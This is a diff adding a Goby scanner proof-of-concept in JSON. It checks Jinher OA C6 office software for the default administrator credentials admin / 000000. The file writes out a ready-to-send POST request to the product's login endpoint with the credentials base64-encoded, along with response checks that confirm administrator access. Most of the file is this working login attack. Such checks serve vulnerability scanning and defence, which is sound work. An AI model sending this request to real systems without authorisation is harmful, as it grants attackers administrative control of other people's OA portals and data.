@@ -1,0 +1,62 @@
+{
+      "Name": "金和OA C6 管理员默认口令",
+      "Level": "2",
+      "Tags": [
+            "Default password"
+      ],
+      "GobyQuery": "(app=\"Jinher-OA\")",
+      "Description": "Jinher OA C6 has default account password admin / 000000",
+      "Product": "Jinher OA C6",
+      "Homepage": "http://oa.jinher.com/",
+      "Author": "PeiQi",
+      "Impact": "<p>The attacker will log in to the OA portal as an administrator<br></p>",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/C6/Jhsoft.Web.login/AjaxForLogin.aspx",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "type=login&loginCode=YWRtaW4=&&pwd=MDAwMDAw&"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "OK",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "系统管理员",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-04-02 09:36:55",
+      "GobyVersion": "1.8.237"
+}
